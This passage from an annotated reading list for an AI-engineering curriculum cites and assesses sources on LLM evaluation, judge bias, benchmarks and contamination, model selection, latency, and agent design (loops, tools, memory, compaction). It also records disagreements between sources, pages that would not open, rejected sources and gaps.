   Why: Assertion-based unit tests drawn from real production samples, and reference-free evals that double as guardrails.
   Checked: Opened. Two years old, but these points haven't been overturned.
Extra if needed: **Task-Specific LLM Evals that Do & Don't Work** by Eugene Yan, 2024-03, https://eugeneyan.com/writing/evals/ (blog, primary: yes). Argues ROUGE, METEOR and BERTScore are "unreliable and/or impractical" for summaries and recommends ROC-AUC/PR-AUC for classifiers. I opened it. This is the evidence for when simple metric checks mislead.
Also serves: evals, offline-evals, llm-as-judge (applied-llms)

### human-review (short)
1. **Q: How many people should annotate my LLM outputs?** by Hamel Husain and Shreya Shankar, 2025-05-31 (modified 2026-09-01)
   https://hamel.dev/blog/posts/evals-faq/how-many-people-should-annotate-my-llm-outputs.html
   kind: blog · primary: yes
   Why: The "benevolent dictator" single-expert approach. When to add annotators, and measuring agreement with Cohen's kappa.
   Checked: Opened. Current.
2. **Human Feedback is not Gold Standard** by Tom Hosking, Phil Blunsom, Max Bartolo, ICLR 2024
   https://arxiv.org/abs/2309.16349
   kind: paper · primary: yes
   Why: Challenges the node's "still the ground truth" note. Human preference ratings under-count factual errors, and assertive answers get rated as more accurate.
   Checked: Opened the abstract page. The page shows "ICLR 2024".
Also serves: llm-as-judge, judge-bias, benchmarks (it bears on Arena-style voting)

### llm-as-judge (deep)
1. **Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena** by Lianmin Zheng et al., NeurIPS 2023 Datasets & Benchmarks (v4 2023-12-24)
   https://arxiv.org/abs/2306.05685
   kind: paper · primary: yes
   Why: The founding paper. GPT-4 judges reach over 80% agreement with humans, and the paper names position, verbosity and self-enhancement bias.
   Checked: Opened the abstract page. The judge models are old (GPT-4 era), but the method and bias names are still the ones people use.
2. **Using LLM-as-a-Judge For Evaluation: A Complete Guide** by Hamel Husain, 2024-10-29 (updated 2026-09-01)
   https://hamel.dev/blog/posts/llm-judge/
   kind: blog · primary: yes
   Why: The step-by-step method ("Critique Shadowing"): one domain expert gives pass/fail plus a critique, you iterate the judge prompt until it agrees with the expert, then run error analysis.
   Checked: Opened. Updated this month.
3. **Evaluating the Effectiveness of LLM-Evaluators** by Eugene Yan, 2024-08
   https://eugeneyan.com/writing/llm-evaluators/
   kind: blog · primary: no (it surveys about two dozen papers)
   Why: Pairwise works better for subjective tasks and direct scoring for objective ones. Reported human–LLM correlation is roughly 0.3–0.8 and falls short of human–human agreement.
   Checked: Opened. A 2024 literature review, still the best map of the research.
4. **Q: How do I know if I can trust my automated eval?** by Hamel Husain and Shreya Shankar, 2026-09-19
   https://hamel.dev/blog/posts/evals-faq/how-do-i-know-if-i-can-trust-my-automated-eval.html
   kind: blog · primary: yes
   Why: How to validate a judge. Split human labels into train/dev/test, measure TPR and TNR rather than accuracy, and watch for overfitting to the dev set.
   Checked: Opened. Current.
5. **Who Validates the Validators?** See success-criteria #2. EvalGen is the research version of aligning a judge to human grades.
6. **LLMs instead of Human Judges? A Large Scale Empirical Study across 20 NLP Evaluation Tasks** by Anna Bavaresco et al., ACL 2025 (rev. 2025-06-02)
   https://arxiv.org/abs/2406.18403
   kind: paper · primary: yes
   Why: Large-scale evidence that judge reliability varies by task: "substantial variability depending on the property being evaluated." Recommends validating against human labels before trusting a judge.
   Checked: Opened the abstract page.
Also for this node: **AlignEval** by Eugene Yan, 2024-10, https://eugeneyan.com/writing/aligneval/ (blog, primary: yes; opened). Label 50–100 samples first with binary labels, then align the evaluator using precision, recall and Cohen's kappa.
Also serves: human-review, judge-bias, online-evals, agent-evals (phase 5)

### judge-bias (short)
1. **Large Language Models are not Fair Evaluators** by Peiyi Wang et al., arXiv 2023-05-29 (rev. 2023-08-30)
   https://arxiv.org/abs/2305.17926
   kind: paper · primary: yes
   Why: Clear numbers on position bias. With ChatGPT as judge, just reordering the answers let Vicuna-13B beat ChatGPT in 66 of 80 cases. Gives fixes: multiple evidence, swapping order, human review for close calls.
   Checked: Opened the abstract page.
2. **Length-Controlled AlpacaEval** by Yann Dubois, Balázs Galambosi, Percy Liang, Tatsunori Hashimoto, COLM 2024 (v2 2025-03-10)
   https://arxiv.org/abs/2404.04475
   kind: paper · primary: yes
   Why: Length bias, and a regression fix for it. Correlation with Chatbot Arena rose from 0.94 to 0.98, and the eval became harder to game by padding answers.
   Checked: Opened the abstract page.
Reserves (both opened):
- **LLM Evaluators Recognize and Favor Their Own Generations** by Panickssery, Bowman, Feng, arXiv 2024-04-15, https://arxiv.org/abs/2404.13076. Covers self-preference.
- **Justice or Prejudice?** (CALM) by Ye et al., arXiv 2024-10, https://arxiv.org/abs/2410.02736. Catalogs 12 biases.
Zheng et al. (llm-as-judge #1) also names all three biases.
Also serves: llm-as-judge, benchmarks (Arena and AlpacaEval)

### synthetic-test-data (short)
1. **Q: What is the best approach for generating synthetic data?** by Hamel Husain and Shreya Shankar, 2025-06-01 (modified 2026-09-01)
   https://hamel.dev/blog/posts/evals-faq/what-is-the-best-approach-for-generating-synthetic-data.html
   kind: blog · primary: yes
   Why: The dimensions → tuples → queries method, and the traps. "prompting an LLM to 'give me test queries' without structure" gives generic output, and "Synthetic data cannot tell you how common a failure is in production."
   Checked: Opened. Current.
2. **A Field Guide to Rapidly Improving AI Products** by Hamel Husain, 2025-03-24
   https://hamel.dev/blog/posts/field-guide/
   kind: blog · primary: yes
   Why: Where synthetic data fits (starting when you have no users, using feature, scenario and persona dimensions). Quotes Bryan Bischof (Hex): LLMs are "surprisingly good at generating excellent - and diverse - examples of user prompts".
   Checked: Opened.
Also serves: evals, data-flywheel

### offline-evals (short)
1. **Q: How are evaluations used differently in CI/CD vs. monitoring production?** by Hamel Husain and Shreya Shankar, 2025-06-29 (modified 2026-09-01)
   https://hamel.dev/blog/posts/evals-faq/how-are-evaluations-used-differently-in-cicd-vs-monitoring-production.html
   kind: blog · primary: yes
   Why: Directly defines offline vs online: "CI evals protect against known regressions before deployment. Online monitoring find failures in production traffic and estimate how often they occur." Keep the CI set small and prefer assertions over judges there. This fits your "eval harness in CI" build.
   Checked: Opened.
2. See evals #2 (Anthropic, demystifying evals). Capability vs regression suites, and tasks graduating from one to the other.
Also serves: online-evals, data-flywheel

### online-evals (short)
1. See evals #2 (Anthropic, demystifying evals). The comparison table: production monitoring is "Reactive; problems reach users before you know", A/B tests are "Slow; days or weeks to reach significance", and user feedback is "Sparse and self-selected".
2. **Q: What's the difference between guardrails & evaluators?** by Hamel Husain and Shreya Shankar, 2025-06-29
   https://hamel.dev/blog/posts/evals-faq/whats-the-difference-between-guardrails-evaluators.html
   kind: blog · primary: yes
   Why: Guardrails are inline checks in the request/response path. Evaluators run afterward on sampled traffic, often reference-free LLM judges, and "feed dashboards, regression tests, and model-improvement loops."
   Checked: Opened.
Also serves: offline-evals, data-flywheel, guardrails (phase 6)

### data-flywheel (deep)
1. **Data Flywheels for LLM Applications** by Shreya Shankar, 2024-07-01
   https://www.sh-reya.com/blog/ai-engineering-flywheel/
   kind: blog · primary: yes
   Why: The main piece on this topic: evaluate → monitor → improve. "Humans need to be in the loop for evaluation _regularly_, as human preferences on LLM outputs change over time."
   Checked: Opened.
2. See evals #1 (Hamel, "Your AI Product Needs Evals"). The flywheel as a side effect of eval infrastructure, where logging traces feeds curated data and fine-tuning.
3. See evals #2 (Anthropic). "Converting user-reported failures into test cases ensures your suite reflects actual usage."
4. See online-evals #2 (Hamel/Shankar). When monitoring finds new failure patterns, add examples to the CI dataset. This is the loop closing.
5. **AI Engineering, chapter summaries** by Chip Huyen (book: O'Reilly, 2025)
   https://github.com/chiphuyen/aie-book/blob/main/chapter-summaries.md
   kind: book (author's free summaries) · primary: yes
   Why: The chapter 10 summary treats user feedback, including feedback from conversational interfaces, as the fuel for the flywheel. Chapter 4 covers model selection (see below).
   Checked: Opened the repo page. The full book is paywalled, so cite only what the summaries say.
6. See code-based-evals #2 (applied-llms). Daily "vibe checks" by sampling production inputs and outputs.
Also serves: online-evals, offline-evals, synthetic-test-data

### benchmarks (deep)
1. **Measuring Massive Multitask Language Understanding (MMLU)** by Dan Hendrycks et al., ICLR 2021
   https://arxiv.org/abs/2009.03300
   kind: paper · primary: yes
   Why: What a classic benchmark measures (57 multiple-choice subjects). When it came out, the largest GPT-3 was only ~20 points above chance.
   Checked: Opened the abstract page. Now saturated; use it as history.
2. **Are We Done with MMLU?** by Aryo Pradipta Gema et al., arXiv (rev. 2025-01-10)
   https://arxiv.org/abs/2406.04127
   kind: paper · primary: yes
   Why: Benchmarks have label errors. "57% of the analysed questions in the Virology subset contain errors", about 6.5% overall.
   Checked: Opened the abstract page.
3. **SWE-bench** by Carlos E. Jimenez et al., ICLR 2024 (rev. 2024-11-11)
   https://arxiv.org/abs/2310.06770
   kind: paper · primary: yes
   Why: How a task benchmark is built: 2,294 real GitHub issues from 12 repos, graded by running tests. The best model at launch (Claude 2) solved 1.96%.
   Checked: Opened the abstract page. The Verified subset has since been retired (next item).
4. **SWE-bench Verified – Benchmark Review** by Epoch AI, 2026-09-03
   https://epoch.ai/benchmarks/swe-bench-verified/review
   kind: blog · primary: no (it reports OpenAI's audit)
   Why: The freshest contamination case. Verdict "Flawed". Reports OpenAI's Feb 2026 audit: "59.4% had flawed test cases that rejected functionally correct submissions". Also: "all frontier models tested have seen at least some of the problems and solutions during training."
   Checked: Opened. Current. The primary OpenAI post returned 403 (see Couldn't open).
5. **A Careful Examination of LLM Performance on Grade School Arithmetic (GSM1k)** by Hugh Zhang et al. (Scale AI), NeurIPS 2024 D&B
   https://arxiv.org/abs/2405.00332
   kind: paper · primary: yes
   Why: Measures contamination with a fresh look-alike test. Some model families dropped up to 8%, and the drop correlated (r² = 0.36) with how well a model could reproduce GSM8k items. It also says frontier models generalize fine, which adds nuance.
   Checked: Opened the abstract page.
6. **The Leaderboard Illusion** by Shivalika Singh et al., arXiv 2025-04-29 (rev. 2025-05-12)
   https://arxiv.org/abs/2504.20879
   kind: paper · primary: yes
   Why: How a human-vote leaderboard gets gamed: private variant testing (27 Meta variants before Llama 4), and data going mostly to big labs (Google ~19.2%, OpenAI ~20.4%).
   Checked: Opened the abstract page.
Supporting (opened):
- **Chatbot Arena** paper by Chiang et al., 2024-03-07, https://arxiv.org/abs/2403.04132. Pairwise crowd votes with Bradley-Terry, 240k+ votes at the time.
- **Arena-Rank: Open Sourcing the Leaderboard Methodology** by the Arena team, 2025-12-18 (updated 2026-02-21), https://arena.ai/blog/arena-rank. Bradley-Terry, style control for length and markdown.
Also serves: model-selection, judge-bias, open-vs-closed-models

### model-selection (deep)
1. **Choosing the right model** by Anthropic docs, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/about-claude/models/choosing-a-model
   kind: docs · primary: yes
   Why: Two starting strategies (efficiency-first vs capability-first). "Having a good evaluation set is the most important step." The effort setting as a lever before switching models.
   Checked: Opened. It names current models (Opus 5.5, Fable 5.1, Sonnet 5, Haiku 4.5), so model names will go stale quickly. Cite the method, not the lineup.
2. **AI Engineering, chapter 4 summary** by Chip Huyen. Same URL as data-flywheel #5.
   Why: "Public benchmarks can help you weed out bad models, but won't help you find the best models for your applications". Benchmarks "are also likely contaminated". Open-source vs APIs is weighed on seven axes.
3. **A Statistical Approach to Model Evaluations** by Anthropic, 2024-11-19
   https://www.anthropic.com/research/statistical-approach-to-model-evals
   (paper: **Adding Error Bars to Evals** by Evan Miller, arXiv 2024-11-01, https://arxiv.org/abs/2411.00640)
   kind: blog + paper · primary: yes
   Why: Needed for your 3+ model comparison: standard errors, clustered errors, paired differences on the same questions, and power analysis for how many cases you need.
   Checked: Opened both. The blog links the paper.
4. **Artificial Analysis – Performance benchmarking methodology** by Artificial Analysis, v2.2.0 dated 2026-03-02
   https://artificialanalysis.ai/methodology/performance-benchmarking
   kind: docs · primary: yes (for their own measurements)
   Why: How a third party measures speed and price. 1k and 10k input workloads run 8 times a day, a daily 10-concurrent run, P50 over 72 hours, from us-central1. The main methodology page uses a blended price of 7:2:1 (cache hit : input : output).
   Checked: Opened both /methodology and this sub-page. Current.
5. **2025 Mid-Year LLM Market Update** by Tim Tully, Joff Redfern, Deedy Das, Derek Xiao (Menlo Ventures), 2025-07-31
   https://menlovc.com/perspective/2025-mid-year-llm-market-update/
   kind: blog (survey, n=150) · primary: yes for its survey data, but written by a VC with portfolio interests
   Why: What builders actually do. "builders don't capture savings by using older models; they just move en masse to the best performing one."
   Checked: Opened. About 14 months old; a newer edition may exist.
Also serves: open-vs-closed-models, llm-latency, token-pricing

### open-vs-closed-models (deep)
1. **Open models lag state-of-the-art closed models by 4 months** by Jack Edwards and Luke Emberson (Epoch AI), 2026-05-29
   https://epoch.ai/data-insights/open-closed-eci-gap
   kind: blog (data insight) · primary: yes
   Why: A current number: about a 4-month gap, or 8 ECI points, "similar to the gap between GPT-5 and GPT-5.5."
   Checked: Opened. It replaces Epoch's 2024 report (5–22 months; see Rejected).
2. **Recent open weights model launches** by Artificial Analysis, 2026-04-30
   https://artificialanalysis.ai/articles/recent-open-weights-model-launches
   kind: blog · primary: yes
   Why: Top open-weights models are 6 points behind the leader on their Intelligence Index, at half to one-sixth the price. 9 of 13 models on the price/intelligence Pareto frontier are open.
   Checked: Opened. No author named.
3. **Kimi Vendor Verifier: Rebuilding the "Chain of Trust"** by Moonshot AI, undated (released with Kimi K2.6)
   https://www.kimi.ai/blog/kimi-vendor-verifier
   kind: blog · primary: yes
   Why: The hidden cost of open weights. The same model served by different hosts differs because of quantization, chat templates and parameters. "Weights are open. The knowledge to run them correctly must be too."
   Checked: Opened (after a redirect from kimi.com).
   Companion: **K2-Vendor-Verifier repo**, https://github.com/MoonshotAI/K2-Vendor-Verifier, last updated 2025-11-15. Schema accuracy ranges from 100% down to 72–83% across 16+ providers. Opened.
4. **When Is the Same Model Not the Same Service?** by Haorui Li et al., arXiv 2026-05-04 (rev. 2026-05-07)
   https://arxiv.org/abs/2605.02821
   kind: paper · primary: yes
   Why: A measurement study of hosted open-weight APIs. Latency, throughput, context and errors differ by provider. Routing cut Qwen3-32B cost by 37.8%.
   Checked: Opened the abstract page. It's a new preprint and not peer reviewed yet.
5. See model-selection #2 (Chip Huyen, chapter 4). Seven axes: privacy, data lineage, performance, functionality, control, cost.
6. See model-selection #5 (Menlo). Open-source share of enterprise workloads fell from 19% to 13%. It blames a performance gap (9–12 months), deployment complexity, and wariness of Chinese providers.
Optional background: **The ATOM Report** by Nathan Lambert and Florian Brand, arXiv 2026-04-08, https://arxiv.org/abs/2604.07190. Chinese open models overtook US ones in summer 2025. Opened.
Also serves: model-selection, llm-latency, benchmarks

### llm-latency (deep)
1. **LLM Inference Performance Engineering: Best Practices** by Megha Agarwal et al. (Databricks/MosaicML), 2023-10-12
   https://www.databricks.com/blog/llm-inference-performance-engineering-best-practices
   kind: blog · primary: yes
   Why: The mechanism. TTFT, TPOT, and latency = TTFT + TPOT × output tokens. Decode is limited by memory bandwidth, and continuous batching matters.
   Checked: Opened. The hardware and model numbers are dated (2023), but the model of where time goes still holds.
2. **NVIDIA NIM LLM Benchmarking: Metrics** by NVIDIA docs, 2026-07-20
   https://docs.nvidia.com/nim/benchmarking/llm/latest/metrics.html
   kind: docs · primary: yes
   Why: Precise definitions (TTFT includes queuing, prefill and network; e2e; ITL; TPS; RPS). "Longer prompts increase TTFT because the attention mechanism uses the full input sequence to create the KV cache".
   Checked: Opened. Current.
3. **Latency optimization** by OpenAI docs, undated
   https://developers.openai.com/api/docs/guides/latency-optimization
   kind: docs · primary: yes
   Why: Seven principles, with a useful ratio: cutting 50% of output tokens "may cut ~50% of your latency", while cutting 50% of the prompt gives "only … a 1–5% latency improvement."
   Checked: Opened (after a redirect).
4. **Reducing latency** by Anthropic docs, undated
   https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/reduce-latency
   kind: docs · primary: yes
   Why: The API-user view: baseline latency vs TTFT, choosing a model, trimming tokens, `max_tokens`, and streaming. Advises getting quality right before cutting latency.
   Checked: Opened. Current (names Haiku 4.5).
5. **Understand LLM latency and throughput metrics** by Anyscale docs, undated
   https://docs.anyscale.com/llm/serving/benchmarking/metrics
   kind: docs · primary: yes
   Why: The same metrics, plus why to track percentiles: "By tracking p95 or p99 latency, you ensure that almost everyone … has a reliable and acceptably fast experience".
   Checked: Opened.
6. **On Evaluating Performance of LLM Inference Serving Systems** by Amey Agrawal et al., arXiv 2025-07-11
   https://arxiv.org/abs/2507.09019
   kind: paper · primary: yes
   Why: Common mistakes in measuring latency (unfair baselines, bad setup, misleading metrics). Useful when you build your own latency measurement.
   Checked: Opened the abstract page.
Also serves: time-to-first-token, tail-latency, prefill-decode, streaming, model-selection

### time-to-first-token (short)
1. See llm-latency #2 (NVIDIA). What TTFT includes and why prompt length raises it.
2. **Response Times: The 3 Important Limits** by Jakob Nielsen (NN/g), 1993, updated 2014
   https://www.nngroup.com/articles/response-times-3-important-limits/
   kind: blog · primary: yes
   Why: The "what users feel" half: 0.1 s feels instant, 1 s keeps the flow of thought, 10 s keeps attention. That is why TTFT and streaming matter.
   Checked: Opened. Old but still the standard reference. It isn't LLM-specific.
Also serves: llm-latency, streaming

### tail-latency (short)
1. **The Tail at Scale** by Jeffrey Dean and Luiz André Barroso, Communications of the ACM, Feb 2013
   https://www.barroso.org/publications/TheTailAtScale.pdf (author's copy; the CACM page gave 403)
   kind: paper · primary: yes
   Why: Fan-out amplification. With a 1-in-100 slow server and 100 servers, "63% of user requests will take more than one second." Hedged requests cut p99.9 "from 1,800ms to 74ms while sending just 2% more requests." Relevant to agents and RAG that make several model calls per request.
   Checked: Opened the PDF and extracted the text; verified both passages and the copyright line.
2. **Service Level Objectives (SRE Book, ch. 4)** by Chris Jones, John Wilkes, Niall Murphy, Cody Smith (Google)
   https://sre.google/sre-book/service-level-objectives/
   kind: book · primary: yes
   Why: "Most metrics are better thought of as _distributions_ rather than averages". Use the 99th or 99.9th percentile.
   Checked: Opened. From 2016, still the standard reference.
Also serves: llm-latency, agent-loop (phase 5), production monitoring (phase 6)

### Disagreements and tensions
- **Binary vs scored judges.** Hamel/Shankar ("Binary labels produce clearer judgments than rating scales") and Yan's AlignEval push pass/fail. Anthropic's develop-tests docs demonstrate Likert and ordinal LLM graders ("4+ empathy rating on 1-5 scale"), and aihero treats eval scores as numbers, not pass/fail.
- **Pairwise vs single-output grading.** applied-llms, OpenAI's docs and Yan favor pairwise comparison for subjective tasks. Hamel's method grades each output alone, pass/fail with a critique. Neither side's own sources include a head-to-head test between the two.
- **Volume vs looking closely.** Anthropic's docs say "prioritize volume over quality" (1,000 auto-graded beats 50 hand-graded). Anthropic's own 2026 engineering post starts from "20-50 simple tasks drawn from real failures", and Hamel's line is that error analysis on about 100 traces is where the value is.
- **How far to trust judges.** Zheng et al. present LLM-as-judge as scalable with over 80% agreement. Wang et al. show order alone can flip results, and Bavaresco et al. find large variation by task. Yan puts judge–human correlation at 0.3–0.8.
- **Humans as ground truth.** The node note says human review is "still the ground truth". Hosking et al. show human preference ratings miss factual errors and reward confident tone. Shankar's criteria drift shows the criteria themselves shift as people grade.
- **Trust in public benchmarks and leaderboards.** Chip Huyen: benchmarks only weed out bad models. The Leaderboard Illusion says Arena is gamed, while Arena-Rank shows the methodology fixes Arena made. OpenAI retired its own SWE-bench Verified (reported by Epoch). GSM1k finds real contamination, but also finds frontier models still generalize.
- **Size of the open-vs-closed gap.** Epoch: about 4 months (and notes that open models "hill-climb public benchmarks"). Artificial Analysis: 6 index points at a fraction of the price. Menlo: 9–12 months, with enterprise share falling. The answer depends on the metric and who is measuring.
- **Does prompt length matter for latency?** Databricks says input length has little effect on total latency, and OpenAI says halving the prompt saves 1–5%. NVIDIA says longer prompts raise TTFT. Both hold: prompt length drives TTFT (prefill), while output length drives total time.
- **Median vs tail.** Artificial Analysis reports P50 speed. The SRE book, Dean & Barroso, and Anyscale all argue the median hides the calls users complain about. Worth saying when you compare models on public speed charts.
- **Where to start in model selection.** Anthropic offers both efficiency-first and capability-first. OpenAI says "keep the lightest setting that meets your quality bar". Menlo's data says builders just jump to the newest top model.

### Couldn't open
- https://openai.com/index/why-we-no-longer-evaluate-swe-bench-verified/ — HTTP 403 with WebFetch and with curl using a browser user agent. I used the Epoch review, which quotes its audit numbers. Primary claims about OpenAI's reasons should wait until you can open this page yourself.
- https://openai.com/index/introducing-swe-bench-verified/ — HTTP 403.
- https://openai.com/index/separating-signal-from-noise-coding-evaluations/ — HTTP 403.
- https://cacm.acm.org/research/the-tail-at-scale/ — HTTP 403. I used the author's PDF on barroso.org instead, which I verified.

### Rejected
- Self-hosting cost "break-even" posts (sitepoint, cloudzy, digitalapplied, braincuber, tokenmix, contracollective and similar) — SEO or vendor content with unsourced numbers; not primary.
- dev.to "5 LLM APIs Tested for Latency" and the tianpan.co tail-latency posts — secondary, no clear method, and the provider-variance claims can't be checked.
- **How far behind are open models?** by Epoch AI, 2024-11-04 (https://epoch.ai/publications/open-models-report) — opened. Superseded by the 2026-05 Epoch data insight. Keep it only as history (5–22 month gap in 2024).
- **On the Societal Impact of Open Foundation Models** by Kapoor et al., 2024 (https://arxiv.org/abs/2403.07918) — opened. It's about policy and risk, not a builder's choice of hosted API vs own weights.
- **OpenAI Model selection guide** (https://developers.openai.com/api/docs/guides/model-selection) — opened. The current page is thin ("experiment…keep the lightest setting that meets your quality bar"). The Anthropic guide covers the same ground with more substance. You could cite it for that one line.
- aihero AI Engineer Roadmap PDF — only a broad overview. The "what are evals" page covers what matters for these nodes.

### Gaps
- **online-evals**: no primary engineering post from a company running online evals with real numbers (sample rates, judge cost, how alerts are set). The current sources are guidance, not case data. Your own logs will have to fill this.
- **data-flywheel**: same problem. No company post shows the loop with before/after numbers. Chip Huyen's chapter 10 is paywalled beyond the summary. Your phase 4 build is what makes this node stand out.
- **tail-latency**: the classic sources are not about LLMs. I didn't find a trustworthy primary source measuring p95/p99 TTFT across LLM APIs. You'll need your own measurements, and Artificial Analysis only reports medians.
- **open-vs-closed-models**: no trustworthy primary source on self-hosting cost vs API cost. Everything I found was vendor SEO. The Moonshot verifier and the arXiv measurement study cover quality and consistency, not TCO.
- **benchmarks**: the primary OpenAI source for retiring SWE-bench Verified was blocked. SWE-Bench Pro (arXiv 2509.16941) showed up in search, but I didn't open it, so it isn't verified. Open it if you want the replacement benchmark covered.

## Phase 5: Agents

I opened every source listed below on 2026-09-23 with WebFetch. The "Checked" line says what the page showed at that point.

### agent-loop (deep)
1. **Building effective agents** by Erik Schluntz and Barry Zhang (Anthropic), 2024-12-19
   https://www.anthropic.com/engineering/building-effective-agents
   kind: blog · primary: yes
   Why: The standard split between "workflows" (fixed code paths) and "agents" (the model directs its own steps), plus the loop: act, get feedback from the environment, repeat, stop on a condition.
   Checked: Page loads. It lists the six patterns (chaining, routing, parallelization, orchestrator-workers, evaluator-optimizer, autonomous agents). It is almost two years old but still the post everyone cites, and nothing newer replaces it.
2. **How the agent loop works** (Claude Agent SDK docs) by Anthropic, undated, checked 2026-09-23
   https://code.claude.com/docs/en/agent-sdk/agent-loop (the platform.claude.com URL now redirects here)
   kind: docs · primary: yes
   Why: The loop from the inside. Each turn is one round trip. The loop ends when a response has no tool calls. It covers `max_turns` and `max_budget_usd` stop limits, result subtypes such as `error_max_turns`, read-only tools running in parallel while tools that write run one at a time, and hooks.
   Checked: Current. It references Claude Code v2.1.217 and today's permission modes, including "auto".
3. **I think "agent" may finally have a widely enough agreed upon definition** by Simon Willison, 2025-09-18
   https://simonwillison.net/2025/Sep/18/agents/
   kind: blog · primary: no
   Why: A one-line definition to quote: "An LLM agent runs tools in a loop to achieve a goal."
   Checked: Loads. The definition is still in use.
4. **ReAct: Synergizing Reasoning and Acting in Language Models** by Yao et al.: see react-pattern #1. The academic origin of the loop.
Also serves: when-not-to-use-agents (#1), human-in-the-loop (#2, permission modes), context-compaction (#2), multi-agent (#2, subagents).

### react-pattern (short)
1. **ReAct: Synergizing Reasoning and Acting in Language Models** by Shunyu Yao, Jeffrey Zhao, Dian Yu, Nan Du, Izhak Shafran, Karthik Narasimhan, Yuan Cao, arXiv 2210.03629, v1 2022-10-06, last revised 2023-03-10 (ICLR 2023)
   https://arxiv.org/abs/2210.03629
   kind: paper · primary: yes
   Why: The paper that named the pattern: reasoning traces and actions take turns. Results: +34% absolute on ALFWorld and +10% on WebShop, from one or two in-context examples.
   Checked: The abstract page loads. v3 is the latest. It is a 2022 prompting technique. Modern models do this loop natively through tool calling, and the article should say so.
2. **ReAct: Synergizing Reasoning and Acting in Language Models** (Google Research blog) by Shunyu Yao and Yuan Cao, 2022-11-08
   https://research.google/blog/react-synergizing-reasoning-and-acting-in-language-models/
   kind: blog · primary: yes
   Why: A plain walkthrough of thought → action → observation, with a figure worth redrawing and concrete numbers: HotpotQA 35.1% vs 29.4% for CoT only, ALFWorld 71% vs 45% for act only.
   Checked: Loads. Same authors as the paper.
Also serves: agent-loop.

### tool-design (deep)
1. **Writing effective tools for agents — with agents** by Ken Aizawa (Anthropic), 2025-09-11
   https://www.anthropic.com/engineering/writing-tools-for-agents
   kind: blog · primary: yes
   Why: The main source for this node. Namespacing by service and resource, a `response_format` enum (206 vs 72 tokens), Claude Code capping tool responses at 25,000 tokens by default, error messages the model can act on, and an eval-driven loop for improving tools.
   Checked: Loads and is current.
2. **Define tools** (Claude API docs) by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/agents-and-tools/tool-use/define-tools
   kind: docs · primary: yes
   Why: Concrete rules. "Provide extremely detailed descriptions", described as "by far the most important factor". At least 3–4 sentences per tool. Group related operations into one tool with an `action` parameter. Return only high-signal fields. `input_examples` cost ~20–200 tokens.
   Checked: Current. It references Claude Opus 5.5 and Fable 5.1 limits on forced tool use.
3. **Function calling guide** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/function-calling
   kind: docs · primary: yes
   Why: A second vendor's view. Keep a soft limit of "fewer than 20 functions" per turn. "Don't make the model fill arguments you already know." Merge functions that are always called in sequence. The "intern test". Strict mode.
   Checked: Loads and is current.
4. **MCP spec 2026-07-28, Tools** by the MCP maintainers, 2026-07-28
   https://modelcontextprotocol.io/specification/2026-07-28/server/tools
   kind: spec · primary: yes
   Why: The clearest statement of error design. Protocol errors are for the client. Tool execution errors (`isError: true`) carry "actionable feedback that language models can use to self-correct". It also covers tool-name rules, `outputSchema`, and advice on stateful tools that take an explicit handle.
   Checked: This is the latest spec revision.
5. **Building effective agents, Appendix 2 ("Prompt engineering your tools")**: see agent-loop #1. Covers the agent-computer interface (ACI) idea and "poka-yoke" arguments that make mistakes hard to make.
6. **Code execution with MCP** by Adam Jones and Conor Kelly (Anthropic), 2025-11-04
   https://www.anthropic.com/engineering/code-execution-with-mcp
   kind: blog · primary: yes
   Why: A different angle on the same problem. Too many tool definitions and big intermediate results fill the context, so the post presents tools as a code API instead: "150,000 tokens to 2,000 tokens".
   Checked: Loads. It notes this needs a sandbox.
Also serves: mcp (#4, #6), sandboxing (#6), agent-evals (#1, eval-driven tool improvement).

### agent-memory (deep)
1. **Effective context engineering for AI agents** by Prithvi Rajasekaran, Ethan Dixon, Carly Ryan, Jeremy Hadfield (Anthropic), 2025-09-29
   https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents
   kind: blog · primary: yes
   Why: Three long-run techniques side by side: compaction, structured note-taking (NOTES.md, the Pokémon example) and sub-agents returning 1,000–2,000-token summaries. Also "just-in-time" retrieval by file path or URL.
   Checked: Loads and is current.
2. **MemGPT: Towards LLMs as Operating Systems** by Charles Packer, Sarah Wooders, Kevin Lin, Vivian Fang, Shishir Patil, Ion Stoica, Joseph Gonzalez, arXiv 2310.08560, v1 2023-10-12, revised 2024-02-12
   https://arxiv.org/abs/2310.08560
   kind: paper · primary: yes
   Why: The OS analogy. The context window is RAM and external storage is disk, and the agent pages data between them itself ("virtual context management").
   Checked: Loads. The project has since become Letta (see #4).
3. **Memory tool** (Claude API docs) by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/agents-and-tools/tool-use/memory-tool
   kind: docs · primary: yes
   Why: A concrete, current memory design. It runs client-side on a `/memories` directory with view/create/str_replace/insert/delete/rename. It shows the system prompt the API injects ("ASSUME INTERRUPTION"), path-traversal risks, and pairing memory with compaction.
   Checked: Current. It covers Claude 4 and later models, and its examples use claude-opus-5-5.
4. **Agent Memory: How to Build Agents That Learn and Remember** by Letta, 2025-07-07
   https://www.letta.com/blog/agent-memory/
   kind: blog · primary: yes (MemGPT authors' company)
   Why: Four memory types (message buffer, core, recall, archival), sleep-time compute, and a clear claim that RAG "is a tool for agent memory, it is not 'memory' in of itself".
   Checked: Loads. No author name is shown.
5. **Cognitive Architectures for Language Agents (CoALA)** by Theodore Sumers, Shunyu Yao, Karthik Narasimhan, Thomas Griffiths, arXiv 2309.02427, v3 2024-03-15
   https://arxiv.org/abs/2309.02427
   kind: paper · primary: yes
   Why: The taxonomy of working and long-term memory (episodic, semantic, procedural) that most memory writing borrows.
   Checked: Abstract page loads. It is a framework paper, not a benchmark, so it does not go stale quickly.
6. **Effective harnesses for long-running agents** by Justin Young (Anthropic), 2025-11-26
   https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents
   kind: blog · primary: yes
   Why: Memory across sessions in practice. An initializer agent, `claude-progress.txt`, git commits and a JSON feature list with 200+ items. Shows the failure modes when each new session "begins with no memory of what came before".
   Checked: Loads and is current.
Also serves: context-compaction (#1, #3), multi-agent (#1), phase 2 RAG nodes (#4 on RAG vs memory).

### context-compaction (short)
1. **Compaction overview** (Claude API docs) by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/compaction
   kind: docs · primary: yes
   Why: The server writes a summary and replaces older turns with it. Compares on-demand compaction, compaction at a token threshold, and your own summarizer. Covers keeping recent turns word for word and running compaction in the background.
